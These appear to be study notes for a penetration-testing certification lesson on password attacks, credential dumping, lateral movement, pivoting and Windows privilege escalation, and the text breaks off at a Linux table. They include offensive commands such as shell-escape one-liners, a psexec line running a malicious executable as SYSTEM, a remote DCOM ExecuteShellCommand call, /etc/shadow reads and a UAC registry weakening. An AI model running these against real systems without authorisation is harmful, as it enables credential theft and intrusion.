## Lesson Introduction
---
A major part of the PenTest process is to gain access into a system. The team will need to launch several attacks, using a variety of methods and tools. These include hash cracking, brute force, and dictionary attacks, employing tools such as John the Ripper, word lists, and Hashcat.

Once the team has gained access into the system, the next step is to see how far they can go. The team may be able to move horizontally or vertically, with the goal of pivoting through the system and exploring exposed resources. After gaining access and then determining any further vulnerabilities, the next logical step is to attempt to maintain persistence. This is achieved by creating a backdoor, so that the team can revisit the system at a later date.

## Lesson Objectives
---
In this lesson, you will:

- Demonstrate methods to test credentials and launch password attacks using tools such as CeWL, John the Ripper, and Cain.
- Compare methods used to escalate privilege and then move throughout the system while launching and gathering authentication credentials.
- Summarize ways to maintain persistence and list methods to create a backdoor for access at a later date.

## Topic 16A - Test Credentials
---
> [!note] Exam Objectives Covered
> *3.1 Given a scenario, research attack vectors and perform wireless attacks.*
> *5.3 Explain use cases of the following tools during the phases of a penetration test.*

Credentials are the way that a legitimate user can gain access into their account, a network, or the entire system. Think of them in terms of a “key.” With them, the user can open many “doors” and reveal many secrets.

To an adversary, credentials are worth more than gold! They provide the attacker with a way to steal, to deface, or even to gain leverage to blackmail!

By testing credentials—or trying to force the revelation of a user’s credentials—an attacker can gain access to those accounts, networks, or systems, and all the secrets they hold.

Many types of attacks have been developed against user credentials because of the intrinsic value that these constructs have. In this topic, you will investigate some of the more commonly-used attacks.

### Comparing Password Attacks
---
#### Online vs. Offline Attacks
Not all password attacks are conducted live, across the network. An offline password attack is one in which the cracker does not try to log in to the target system. Instead, a copy of the file that contains usernames and passwords is stolen from the system and attacked offline.

An example file could be `/etc/shadow` in Linux or the SAM database in Windows, attacking both of these will be explored later in this Lesson.

Once the attacker has exfiltrated the file, they then run the attacks on their own machine, against the file. This is known as “password cracking.” An alternative to stealing the entire file is to get the system to display (**dump**) all of the credentials in their hashed format, take a copy of the dump, and then subject it to the cracker. This is also known as **hash cracking**.

***Password cracking*** is the act of trying to guess or decode a password. Passwords can be found in many locations, all of which are vulnerable to attack. A few passwords are stored in cleartext, but most are stored as a hashed value. A ***hashed value*** is one that went through a one-way cryptography function that usually results in both a fixed-length value and a unique mapping that is almost impossible to reverse.

Additionally, a randomly generated string can be added to the password before hashing, known as a **salt**. This salt can be stored along with the hashed password for verification purposes, so as not to store cleartext passwords and to further frustrate certain types of password attacks. One of the biggest constraints to effective password cracking is having the necessary processing power or, alternatively, having a sufficiently large password dictionary.

A ***dictionary attack*** is the most straightforward type of automated password attack. A password cracking tool goes through a list of words until it either finds the password or exhausts the list. The hope is that the list is large enough to contain the password.

Since most users choose simple, easy-to-remember passwords, chances are excellent that many common passwords can be found in the list. Security researchers have spent years collecting and collating wordlists, and some are dedicated to specific services and uses, such as **SecLists** ( [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) ).

Some online websites, under the guise of password strength testing, actually collect passwords from visitors to add to these lists.

Here are some examples of wordlists included in Kali:
![[Pasted image 20240620120935.png]]
*Kali Wordlists*

There are practical limits to using a dictionary attack. You must first know the username. Some password crackers allow the use of, and include lists of, common usernames, including administrator-type accounts.

Password lists can become unwieldy in size. A list of 1.5 billion words is about 15 GB (uncompressed) in size. This may be difficult for the password cracker (or its system) to load or manage.

Most systems have policies that lock out a user after a certain limit has been exceeded, for example, only a few wrong password attempts are allowed, then a time delay is invoked.

There are several techniques that an attacker can use to bypass these limits. These include:

- Stealing a copy of the file or database that contains the user credentials and attempting to crack the passwords offline
- Inducing the system to "dump" its passwords (in hashed format) so that you can crack them offline
- Intercepting a network authentication and sending the intercepted login hash to the password cracker
- Running the password cracker against a network service that does not have a lockout policy
- Running the password cracker against a user account such as administrator or root that is exempt from a lockout policy

A ***brute force attack*** is one in which the attacker tries many passwords in the hope of eventually guessing the right one. It is called a brute force attack because the attacker is just going through every possible option. This is similar to attacking a 4-digit bicycle lock by trying 0001, 0002, 0003… all the way to 9999.

The obvious flaw in a brute force attack is that the maximum length of time it takes to try all combinations is simply a function of the time it takes to do one test, multiplied by the number of different combinations. As an example, if it takes five seconds to test the bicycle lock, and there are 1,000 combinations, it will take 5,000 seconds to test every option. Brute force attacks are limited by processing power and other resources (such as memory and storage space).

> [!warning] If you were to replace this with a 5-digit lock, then it would immediately take a maximum 50,000 seconds to break. Thus, a standard rule of passwords: longer length = more difficult to break.

> [!warning] You may have thought, "I’ll just make the password 9998. This will take the longest time to search for!" The problem with this approach is, what if the attacker starts at 9999, and counts down? Because of this issue, most attack software doesn’t start at either end, but breaks the attack space down into chunks, and selects chunks to search “randomly”.

There are different types of variations on brute force attacks that can try to shorten the search time by using shortcuts. A **rule attack** can make use of word lists to create variants and combinations. If the attacker's dictionary is exhausted, the cracking tool can then try variations of the passwords by trimming or expanding words or substituting numbers or special characters for letters. It can also try specific combinations of characters using placeholders (i.e., **`: ?a?a?d?d?d?d`**), which is known as a **mask attack**. The main problem here is that some level of knowledge of the mask is required. If you guess wrong, the entire search is a waste of time.

If the password is used to create an encryption key, the attacker could alternatively try to guess the key. An example of this is a Wi-Fi password that is used to create a hexadecimal-based numeric key. The user need not guess the original password but, rather, use other ways to extract the key and use it to access the system.

If the password is short, such as an 8-digit PIN, an automated tool could go through all possible combinations in minutes. The longer and more complex the password, the harder it will be to break. Not only that, but security solutions might detect the rapid and successive attempts or security policies might prevent repeated failed attempts and lock the account. There is a contained approach to work around this.

***Password spraying*** is the concept of controlled brute forcing by testing several accounts with common or targeted passwords. The speed at which the requests are sent can also be limited, and particular masks and other techniques can be used to tailor the attack.

> [!important] Password Spraying vs. Brute Force
> A type of cyberattack where a malicious actor tries to access many accounts using a few common passwords. It's a type of brute force attack, but differs from traditional brute force attacks in that it targets multiple accounts with one password at a time, instead of targeting a single account with multiple passwords.


### Attacking Windows & Linux Passwords
---
#### Linux Hashing Algorithms
Originally, passwords in Linux were stored in cleartext along with their user accounts in `/etc/passwd`. For security, they are now stored as hash values in `/etc/shadow`. The hashing algorithm used in `/etc/shadow` depends on the distribution. It can be MD5, Blowfish, (or more recently) SHA-256 or SHA-512. To find the hashing algorithm in use, enter the command `sudo cat /etc/shadow` at a terminal window.

Look for hashes that begin with a **`$`** and compare them to this list:

- $1 = MD5
- $2a = Blowfish
- $5 = SHA-256
- $6 = SHA-512

An example result is shown here, indicating that SHA 512 has been used to hash the password:
![[Pasted image 20240620121928.png]]
*Hashed Password*

> [!warning] For more information about Linux hashing at a terminal window, enter "**`man 3 crypt`**".

#### Windows Hashing Algorithms
Windows uses passwords to authenticate users, services, and computers. Third-party applications can have their own passwords as well. <mark style="background: #FFF3A3A6;">Since Windows NT 4.0, Windows has stored local usernames and passwords in the</mark> ***Security Account Manager (SAM)***. <mark style="background: #FFF3A3A6;">This is a Registry hive that is stored on disk in</mark> **`%WINDIR%\System32\config\SAM`** <mark style="background: #FFF3A3A6;">and loaded into memory on bootup.</mark>

Passwords are stored as two types of hashes:

- **LanMan** (LM) hash: Before hashing, passwords are converted to uppercase and then either truncated or padded to become 14 characters long. The actual value that is stored is not the password hash itself. Instead, the hash is divided into two 7-byte parts, each of which is used as a 56-bit DES key to encrypt the fixed string "KGS!@#$%". Because the hash is unsalted, it is susceptible to dictionary and rainbow table attacks.
- **NT** hash: This is a simple MD4 hash of the password (encoded as UTF-16 little endian). It is unsalted but allows passwords up to 128 characters long.

From a broader perspective, not all authentication is done through passwords. Some credentials are stored as private keys, certificates, or ***ticket granting tickets (TGT)***, which are used for network authentication. Those too can be targeted.

The ***Windows Local Security Authority (LSASS)*** uses **LSA secrets** <mark style="background: #FF5582A6;">to store a variety of user, service, and application passwords. In some cases, such as with Kerberos or LSA secrets, they can be found in memory after the user logs on, or the computer boots up, and can be dumped using tools like Mimikatz.</mark>

### Evaluating Password Cracking Tools
---
There are many password-cracking tools available, with many being multi-featured. Some tools, like Hashcat, use the additional processing power of the computer's graphics card (GPU). For example, Hashcat can run on a cloud server with multiple GPUs for maximum efficiency.

Others, like John the Ripper, have the ability to use multiple CPUs, and enables portability because it can pause the cracking in one device to resume on a different one.

Additionally, there are tools that create or curate wordlists for specific uses. These can create lists that meet specific password requirements which are later used by password cracking tools or create a list of usernames to use by credential testing tools.

Here are some examples of tools that aid, perform, or are otherwise relevant for password cracking, hash cracking, and credential testing:

|   **Tool Name**   | **Description**                                                                                                                                                                                                                                                                                                          |
| :---------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|      *Cain*       | Cracking and dumping tool that was <br>successfully used for many years. <br>Today, replaced by tools like hashcat <br>or John the Ripper for cracking (see below) <br>and tools like mimikatz for dumping.                                                                                                              |
|    *mimikatz*     | Tool that gathers credentials by <br>extracting key elements from <br>memory such as cleartext passwords, <br>hashes, and PIN codes.                                                                                                                                                                                     |
|     *hashcat*     | Modern password and hash cracking <br>tool that can speed up the process by <br>using different attack methods <br>(dictionary, mask, hybrid) to add complexity <br>and variability. Supports use of GPU for <br>parallel cracking.                                                                                      |
|     *medusa*      | Parallel brute-forcer for network <br>logins. Its focus is to support numerous <br>network services that allow remote <br>authentication.                                                                                                                                                                                |
|   *brutespray*    | Tool that allows to interpret results <br>from an Nmap scan to automatically start <br>medusa against the identified open ports. <br>Can also use results from Nmap with <br>option **`-sV`** to identify and target services <br>on non-standard ports.                                                                 |
|      *hydra*      | Similar to medusa, it supports parallel testing <br>of several network authentications. It comes <br>bundled with a tool called pw-inspect that <br>allows for analyzing a dictionary and printing <br>only the ones that match password requirements.                                                                   |
|     *crunch*      | Generates word lists based on specified <br>conditions such as character set (with <br>Unicode support), upper/lowercase, and<br> minimum and maximum length.                                                                                                                                                            |
|      *CeWL*       | Generates word lists based on automatically <br>navigating a website and collecting words <br>from text as well as author/creator metadata <br>from files that are found.                                                                                                                                                |
| *John The Ripper* | Highly optimized, can identify a large set <br>of hashes with its community edition ('Jumbo') <br>and can run on multiple platforms.                                                                                                                                                                                     |
|     *Patator*     | Multi-purpose brute-forcer which supports <br>several different methods, including FTP, SSH, SMB, <br>VNC, and Zip passwords.                                                                                                                                                                                            |
|    *DirBuster*    | URL brute-forcer that comes bundled with <br>different word lists geared towards web <br>applications and sites to identify directories and <br>files that do not have links or references but can <br>still be accessed. Can also enhance what CeWL <br>will be able to access in order to generate <br>new word lists. |
|   *Burp Suite*    | Tool that contains module for advanced <br>credential testing on web/application <br>servers (Discussed in more detail in Lesson 13, <br>'Web Application-based Attacks').                                                                                                                                               |
|      *PACK*       | The Password Analysis and Cracking Kit, <br>a collection of tools that helps investigating <br>passwords for more efficient password cracking. <br>It does statistical analysis to detect patterns like masks, <br>character sets in use, and other details.                                                             |

#### Alternative Methods to Obtain Credentials
Before we dive into more advanced credential attacks, let’s explore a few alternative methods of obtaining passwords.

A very successful but, in some cases, notably more engaging method is the use of social engineering to obtain user credentials:

- Kali Social Engineering Toolkit (SET)
- Fake login websites
- Shoulder surfing

Another technique is installing a physical or software-based keylogger to capture login credentials:

- Hardware-based USB keyloggers (requires physical access)
- Meterpreter `keyscan_start` and `keyscan_dump`

#### Credential Testing Methods and Tools
The following are some common attack methods for credential testing and sample tools to use in each scenario:

|                                                                                  **Attack Methods**                                                                                  | **Tool**                                                                                                                                                                                                                                                                                                                                                                    |
| :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                                         Brute force the login passwords of <br>services such as SSH, telnet, FTP,<br>HTTP, Samba, VNC, etc.                                          | Medusa<br><br>Hydra<br><br>Ncrack<br><br>Crowbar<br><br>Metasploit 'scanner' modules                                                                                                                                                                                                                                                                                        |
| Copy the SAM file on Windows or the <br>`/etc/passwd` and `/etc/shadow` files <br>on Linux. You must 'unshadow' (or <br>combine) the copies and send them <br>to a password cracker. | John the Ripper<br><br>Hashcat                                                                                                                                                                                                                                                                                                                                              |
|                                               Dump the hashes from a <br>compromised machine and send <br>them to a password cracker.                                                | Dump: mimikatz, mimpenguin <br>([https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin)),<br> <br>Metasploit modules:<br><br>`post/linux/gather/hashdump`<br><br>`post/windows/gather/hashdump`<br><br>Crack: John the Ripper, Hashcat<br>(Search also 'Kerberoasting' this is covered in Lesson 9)                                      |
|                                                 Install a physical or software-based <br>keylogger to capture login <br>credentials.                                                 | Meterpreter `keyscan_start` and <br>`keyscan_dump`<br><br>Hardware-based USB keyloggers <br>(Requires physical access)                                                                                                                                                                                                                                                      |
|                                                                    Boot target into single user mode <br>(Linux)                                                                     | Reboot the computer and interrupt <br>the boot process.<br><br>**Step 1:** Edit GRUB to go into single <br>user mode, where you are automatically <br>logged in as root with no password.<br><br>**Step 2:** Change the password.<br><br>Requires physical access. Works for <br>Red Hat and other distros. Does not <br>work for Debian-based distros, <br>including Kali. |

Metasploit has many modules that will attempt to brute force or bypass the login of specific services, such as:

- `auxiliary/scanner/ssh/ssh_login`
- `auxiliary/scanner/ftp/anonymous`
- `auxiliary/scanner/ftp/ftp_login`
- `auxiliary/scanner/vnc/vnc_login`
- `auxiliary/scanner/smb/smb_login`

To find more examples of scanners at the `msfconsole`, enter:
`search auxiliary/scanner`

To find platform specific login modules, enter:
```bash
search login platform:linux
search login platform:windows
```

If it is not practical to try to crack the password, the attacker might instead steal the password hash and supply that in place of the password itself. (For details on these attacks see “Pass the Hash & Other Credential Attacks” in the next Topic.)

## Topic 16B - Move Throughout the System
---
> [!note] Exam Objectives Covered
> *3.7 Given a scenario, perform post-exploitation techniques.*
> *5.3 Explain use cases of the following tools during the phases of a penetration test.*

Gaining access to an organization's network and hosts is not always a straightforward exercise. There may be cases in which you will face additional challenges, such as when the shell you managed to remotely open has a limited interface.

More importantly, in order to thoroughly test the client's assets, you will need to go deeper and branch out with your attack. This is where escalation of privilege and lateral movement come into play. The techniques performed after the initial attack are commonly referred to as ***post-exploitation*** activities.

### Upgrading a Restrictive (Linux) Shell
---
There are cases in which the shell we obtain seems confined: changing directories is not allowed, specifying absolute pathnames with slash (/) does not work, and the output is being redirected. In these cases, we are facing a restrictive shell.

There are technical shortcomings that are important to a penetration tester, such as SSH not working properly in a restrictive shell, which might affect our attempts to create a tunnel through it for further attacks. There are some workarounds for this:

Using Python:
**`python -c 'import pty; pty.spawn("/bin/bash")'`**

Using Perl:
**`perl -e 'exec "/bin/sh";'`**

From within vi/vim:
```bash
:set shell=/bin/sh
:shell
```

> [!important] Restricted shells commonly prevent users from changing directories, setting **`PATH`** or **`SHELL`** variables, specifying absolute pathnames, and redirecting output.

### Moving Laterally
---
***Lateral movement*** is the process of moving from one part of a computing environment to another. After you gain access to the initial part of the environment, you can spread your attack out to compromise additional resources. This ensures that your test encompasses more than just a narrow selection of resources.

Likewise, you may be able to discover additional, or new, vulnerabilities in the environment that you would otherwise miss if you stayed in place. Lateral movement can also support stealth as, in some cases, you'll draw greater attention to your attack if you focus on only a single resource or a small group of similar resources.

One of the most common forms of lateral movement is to jump from one network host to the next. You might gain access to an employee's workstation from the outside, then use that workstation to set up a connection to an application server, which you then use to open up access to a database server, and so on. Essentially, you're going further and further into the network, looking for new targets or new vectors with which to spread the attack.

There are several techniques that can make lateral movement easier, namely, reconnaissance. Once you compromise the _patient zero_ host, you can sweep the network for other hosts, as well as enumerate network protocols, ports, and logical mapping. This helps you discover where additional hosts are and what hosts you can move to.

An efficient way to investigate the relationships in a network that uses Active Directory (AD) is through the use of exploiting its protocols and operation. Exploiting tools like Responder.py ([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)) and BloodHoundAD can be used here. **BloodHoundAD** can quickly explore AD trust relationships, abusable rights on AD objects, security group memberships, SQL admin links, and more. Results are displayed in a GUI and allow the PenTest team to plan the next steps.

At a lower level, lateral movement can also refer to moving exploit code, or a session, into another running process. This can help you evade defensive efforts to identify and eliminate malicious processes. Migrating code to a known, existing process (e.g., explorer.exe), can also enable you to take on the features and privileges of that process.

#### Lateral Movement with Remote Access Services
Remember from Lesson 14 that you can leverage remote access services like shells for the initial access. Similarly, you can use CLI services for lateral movement, just like some GUI remote access services can be targeted for this purpose.

The following table shows software that has a GUI and can be used:

| **Remote Desktop Service/Protocol** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| :---------------------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|    Remote Desktop Protocol (RDP)    | RDP is the default remote desktop <br>service that comes with Windows systems. <br>It allows full remote control via a GUI window. <br>It can take local account credentials or domain <br>credentials and supports varying levels of <br>encryption. The service must be enabled <br>on the system you want to connect to, <br>otherwise the connection attempt will <br>be rejected.                                                                                                                             |
|     Apple Remote Desktop (ARD)      | ARD is similar in purpose to RDP, but it <br>runs on macOS systems. It supports full <br>remote control through a GUI and supports <br>encryption. Like RDP, the service must be <br>enabled on the target system before you <br>can connect to it through ARD.                                                                                                                                                                                                                                                    |
|         X Window System (X)         | X is a graphical display system for <br>Unix-based computers. X actually operates <br>on a client and server model, so you can <br>remotely control specific windows on a <br>computer over a network.<mark style="background: #FFF3A3A6;"> The connection <br>between X client and X server is not <br>encrypted, but you can use a technique <br>called X forwarding so that the server <br>directs the connection through an SSH <br>tunnel.</mark> This behavior is the default in <br>modern versions of SSH. |
|   Virtual Network Computing (VNC)   | VNC is yet another service that enables <br>full remote control of a desktop, but <br>unlike the others listed, it is cross-platform. <br>A VNC server must be installed on the target <br>machine, which you can access with a <br>corresponding client. There are many <br>different implementations of VNC, <br>and their level of security varies.                                                                                                                                                             |

#### Lateral Movement with Remote Management Services
Remote management services enable you to issue commands to remote systems. <mark style="background: #FF5582A6;">These differ from remote access technologies in that remote management does not usually involve an interactive shell.</mark> ***Windows Remote Management (WinRM)*** is technology that provides an HTTP ***Simple Object Access Protocol (SOAP)*** standard for specific remote management services on Windows systems.

**Windows Management Instrumentation** (WMI), for example, provides an interface for querying data about remote systems. The following uses WMI command-line (WMIC) to get the name of the currently logged in user of a remote system:

`wmic /node:192.168.1.50 computersystem get username`

When using WMIC, you may see a notice or a warning about it being deprecated. This is just the command-line, and not the underlying remote management system.

The same queries can be performed using PowerShell and its cmdlet named **`Get-CimInstance`**, which is not as easy to type in terminal, but provides a more powerful way of querying and managing information.

As an example, here are two lines of code to be run locally, one using **WMIC** which will return a simple string, and the next using **`Get-CimInstance`**, which will return an object we can convert to other formats, like JSON:
```PowerShell
wmic diskdrive get Status,Model
Get-CimInstance -ClassName Win32_diskdrive | Select-Object
status, model | ConvertTo-JSON
```


There is also PowerShell remoting, which requires that the target system has the WinRM service set up to receive remote PowerShell commands. For example, to view the contents of `C:\Windows\system32`:

`Invoke-Command -ComputerName 192.168.1.50 -ScriptBlock { Get-ChildItem C:\Windows\System32 }`

Additionally, there is PsExec, which uses Server Message Block (SMB) to enable you to issue commands to a remote system. For example, to run an executable in the SYSTEM account you can enter:

`psexec \\192.168.1.50 -s "C:\bad-app.exe"`

#### Lateral Movement with RPC/DCOM
Methods like PsExec, WMI, logging in using Telnet and SSH, etc., tend to stand out to administrators or security personnel who are paying close attention to their systems. <mark style="background: #FFF3A3A6;">Using RPC/DCOM can help you evade notice.</mark>

***Remote Procedure Call (RPC)*** enables inter-process communication between local and remote processes on Windows. ***Distributed Component Object Model (DCOM)*** enables communication between software components over a network. DCOM applications use RPC as a transport mechanism for client requests. Flaws in DCOM can enable you to execute code on a remote system by assuming user privileges.

For example, a DCOM application commonly used to initiate lateral movement is MMC20.Application. This enables users to execute ***Microsoft Management Console (MMC)*** snap-in operations on a Windows computer. The MMC20.Application application includes an `ExecuteShellCommand()` method that does exactly what its name implies.

You can leverage this method by creating an instance of a DCOM object using PowerShell:

`$obj = [activator]::CreateInstance ([type]::GetTypeFromProgID ("MMC20.Application","192.168.1.50"))`

Note that the first argument in `GetTypeFromProgID()` refers to the DCOM application mentioned before, and the second argument is the IP address of the remote machine you want to move to.

You can then invoke the `ExecuteShellCommand()` method on the object you created:

`$obj.Document.ActiveView.ExecuteShellCommand ("C:\Windows\system32\calc.exe",$null,$null,"7")`

The first argument is the app or command that will start here, the Calculator app. The second argument specifies the current working directory, and the third specifies any parameters to add to the command. In this case, none are needed, so they are set to null. The last parameter specifies the state of the window. Ultimately, this will launch the Calculator app on the remote computer under a local administrator account.

You can, of course, do much more than just launch a simple app. The point of lateral movement is to "own" the next host you move to, so you can compromise it in many different ways. There are also other DCOM applications and methods you can use to move laterally. However, DCOM is blocked, by default, on modern Windows Defender firewalls, so you shouldn't expect this to work with any regularity.

#### Pivoting: Lateral Movement into Other Networks or Restricted Areas
Pivoting is a process similar to lateral movement. In lateral movement, you jump from one host to the next in search of vulnerabilities to exploit. When you pivot, you compromise one host (the pivot) that enables you to spread out to other hosts that would otherwise be inaccessible.

This is necessary when you want to move to a different network segment than the one you are currently on. For example, if you are able to open a shell on a host you've compromised, you can enter commands in that shell to see other network subnets that the host might be connected to. From here, you can use the pivot host to spread out to these other subnets.

_Despite the distinction, lateral movement and pivoting are often used interchangeably._

There are several techniques that can enable pivoting:

|             **Pivoting Technique**             | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| :--------------------------------------------: | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                Port forwarding                 | You use a host as a pivot and are able <br>to access one of its open TCP/IP ports. <br>You then forward traffic from this port to <br>a port of a host on a different subnet using <br>various methods. One common method is <br>to forward port 3389 (RDP) to a Windows <br>target for remote desktop access.                                                                                                                                                                                                                                |
|                  VPN pivoting                  | You run an exploit payload on a compromised <br>host that starts a VPN client on its network <br>interface. Meanwhile, you run a VPN server <br>outside the network, and relay frames of data <br>from that server to the client. The data frames <br>are dumped onto the client and can now <br>interface with the wider private network. Any <br>traffic that the client (pivot host) sees can then <br>be relayed back to your VPN server. VPN pivoting <br>is commonly used to perform additional <br>reconnaissance of a target network. |
| SSH pivoting <br>(Also known as SSH tunneling) | You connect to the compromised pivot through <br>SSH using the **`-D`** flag. This flag sets up a <br>local proxy server on your attack machine, as <br>well as enables port forwarding. Connections <br>to this proxy on the port specified are forwarded <br>to the ultimate target through the pivot. SSH <br>pivoting is often used to chain proxy servers <br>together in order to continue pivoting from <br>host to host.                                                                                                              |
|            Modifying routing tables            | After opening a shell on the pivot host, you can <br>also add a new route to the pivot host's routing <br>table. This new route includes a destination subnet <br>and a gateway. You define the gateway as your own <br>exploit session, so that any traffic sent to the subnet <br>must tunnel through your session. Adjusting routing <br>tables in this manner is often used as a way to reach <br>different subnets.                                                                                                                      |

### Obtaining the Hash
---
A pass the hash attack is when you log on to the target operating system or application providing the username and the hash of the password, rather than the password itself. You obtain the hash by inducing the operating system or application to dump them from RAM, the Windows Registry, or a credentials file.

You can use Mimikatz to dump different important hashes. You can also use other tools such as Responder.py to obtain hashes from different services on the network. Metasploit also has many hashdump-related modules you can use against Linux, Windows, applications, and other platforms. Most of them are post modules you run after you have compromised the target and obtained a Meterpreter prompt.

Here are a few options for collecting hashes:

- `post/windows/gather/smart_hashdump`
- `post/linux/gather/hashdump`
- `post/pro/multi/gather/hashdump`
- `post/windows/gather/credentials/domain_hashdump`
- `post/windows/gather/credentials/mssql_local_hashdump`
- `post/windows/gather/credentials/skype`
- `post/windows/gather/credentials/avira_password`
- `post/windows/gather/credentials/mcafee_vse_hashdump`

The figure below shows an example of dumping hashes with Meterpreter:
![[Pasted image 20240620132618.png]]
*Dumping Hashes*

_To obtain a complete list of hashdump-related Metasploit tools, conduct a search at the Metasploit console, such as_ `search hash platform:windows_._`

Once you have the hashes, there are several tools you can use to test usability and pass, or crack, them (as discussed in “Password Attacks”). These include:

- Metasploit modules `exploit/windows/smb/psexec` and `auxiliary/scanner/smb/smb_login`
- Hydra
- Medusa

The following figure shows an example of a “pass the hash” attack in Metasploit:
![[Pasted image 20240620132651.png]]
*Pass the Hash*

Passing the hash does not work in all cases. For example, Windows Defender Credential Guard protects against this. You wouldn't even be able to pass the Administrator hash. You would need to turn off Windows Defender first.

Separately, if Windows Defender is not running on the target, you might have to edit the Registry. <mark style="background: #FF5582A6;">Windows operating systems starting with Vista have a User Account Control (UAC) policy setting that disallows other local administrators from running privileged tasks across the network.</mark>

If you want to pass the hash of another local admin, you could disable the restriction by navigating the Registry to `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`, and then creating a DWORD entry of `LocalAccountTokenFilterPolicy` with a value of 1.

> [!warning] For information about disabling Windows Defender Credential Guard, see [https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage).

> [!warning] For more information on disabling the `LocalAccountTokenFilterPolicy`, see [https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)_._.

### Escalating Privilege
---
As part of our process of moving through the system, we might face a major challenge—you do not have access to the resources you need.

Here is where privilege escalation comes in. Sometimes abbreviated simply as PrivEsc, there are two important ways in which this is performed that need to be taken into consideration.

Vertical Privilege Escalation is to obtain access to an account of higher privileges than the one you currently have, in order to enable administrative resources that the regular user does not have permission for. In many cases you will need vertical PrivEsc for certain persistence techniques that will be covered later.

Depending on what you are looking for, and the security implementations in place, there may be cases in which it is better not to immediately target administrator accounts.

Horizontal Privilege Escalation is obtaining access to a regular user account of different privilege than the one currently in use, to enable private resources you otherwise do not have permission for.

### Gaining Control in Windows
---
Privilege escalation is one of the primary objectives in any penetration test. It allows the attacker to gain control, access or change sensitive files, and leave permanent backdoors. During a PenTest, you will rarely get administrative access to a target system on your first attempt. You'll need to find a way to elevate your access to administrator, and then (hopefully) SYSTEM level.

In addition to kernel-specific exploits, there are other types of exploits that can elevate privilege. They take advantage of services, drivers, and applications running in SYSTEM or administrator privilege. Like the kernel exploits, most are run locally after you have gained access to the target.

Here are a few examples:

|        **Vulnerability/Technique**        | **Description**                                                                                                                                                                                                                                                  | **Exploit/Tool**                                                                                                                                                                                                                            |
| :---------------------------------------: | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|            Credential attacks             | Targeting logins and/or dump cleartext or <br>hashed passwords from different sources. <br>Attacks may include hash cracking, <br>password spraying, pass the hash, pass <br>the ticket, etc.                                                                    | Mimikatz (can also allow users to view and save Kerberos authentication credentials)<br>responder.py<br>Metasploit Meterpreter<br>(See also Topic "Test Credentials".)                                                                      |
|        User application compromise        | Compromise applications such as SharePoint, <br>Cisco AnyConnect, browsers, or PDF <br>viewers to gain access to a workstation <br>and/or escalate privileges. These attacks <br>may require a victim to open a file or web <br>page through social engineering. | Metasploit modules:<br><br>`exploit/windows/http/sharepoint_unsafe_control`<br><br>`exploit/windows/local/anyconnect_lpe`<br><br>`exploit/windows/fileformat/nitro_reader_jsapi`<br><br>`exploit/windows/fileformat/adobe_pdf_embedded_exe` |
|             Local UAC bypass              | Bypass local UAC. Example: use process <br>injection to leverage a trusted publisher <br>certificate.                                                                                                                                                            | UACMe: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)<br><br>Metasploit modules:<br><br>`post/windows/gather/win_privs`<br><br>`exploit/windows/local/bypassuac`<br><br>Meterpreter `getsystem`                     |
|         Weak process permissions          | Find processes with weak controls and <br>see if you can inject malicious code <br>into those processes.                                                                                                                                                         | Metasploit modules:<br><br>`post/multi/recon/local_exploit_suggester`<br><br>`post/multi/manage/shell_to_meterpreter`<br><br>Meterpreter `migrate` and `getsystem` commands                                                                 |
|              Shared folders               | Search for sensitive information in <br>shared folders, as it is common for <br>them to have few or no restrictions.                                                                                                                                             | smbclient<br><br>smbmap<br><br>Metasploit module: `auxiliary/scanner/smb/smb_enumshares`                                                                                                                                                    |
|               DLL hijacking               | Elevate privileges by exploiting weak <br>folder permissions, unquoted service <br>paths, or applications that run from <br>network shares. Replace legitimate <br>DLLs with malicious ones.                                                                     | [https://itm4n.github.io/windows-dll-hijacking-clarified/](https://itm4n.github.io/windows-dll-hijacking-clarified/)<br><br>Metasploit module: `exploit/windows/local/trusted_service_path`                                                 |
|             Writable services             | Edit the startup parameters of a service, <br>including its executable path and account. <br>You could also use unquoted service paths <br>to inject a malicious app that the service <br>will run as it starts up.                                              | AccessChk.exe<br><br>Metasploit module: `exploit/windows/local/service_permissions`                                                                                                                                                         |
| Missing patches and <br>misconfigurations | Search for missing patches or common <br>misconfigurations that can lead to <br>privilege escalation.                                                                                                                                                            | BeRoot Project [https://github.com/AlessandroZ/BeRoot](https://github.com/AlessandroZ/BeRoot)<br><br>WES-NG [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)                                                        |

> [!warning] For more information on bypassing UAC for privilege escalation, see [https://www.greyhathacker.net/?p=796.](https://www.greyhathacker.net/?p=796)

> [!warning] To search Metasploit for local exploits that escalate privilege, at the `msfconsole`, enter `search exploit/windows/local -S Escalation`.

### Escalating Privileges in Linux
---
As with penetration testing Windows targets, once you have compromised a Linux host, you probably need to escalate your privilege to achieve your objectives. Many of the basic concepts that are used in Windows are also used in Linux, though the specific targets and methods may be different.

Here are common methods for escalating privilege in Linux:

|        **Vulnerability/Technique**        | **Description**                                                                                                                                                                                    | **Exploit**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
